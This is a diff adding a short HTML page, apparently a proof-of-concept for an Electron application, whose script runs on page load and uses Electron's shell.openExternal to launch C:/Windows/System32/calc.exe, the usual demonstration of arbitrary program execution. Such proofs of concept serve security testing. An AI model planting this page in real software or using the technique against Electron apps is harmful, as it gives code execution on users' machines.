@@ -1,0 +1,25 @@
+<html>
+<head>
+    <title>jruru Link</title>
+</head>
+<body>
+    <a id="jruruLink">jruru Link</a>
+
+    <script>
+         // Script function definition
+        function openExternal() {
+            try {
+                const { shell } = require('electron');
+                shell.openExternal('file:C:/Windows/System32/calc.exe');
+            } catch(e) {
+                alert('JRURU - External link cannot be opened.');
+                console.error(e);
+            }
+        }
+        // Automatically execute openExternal function after the page is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            openExternal();
+        });
+    </script>
+</body>
+</html>
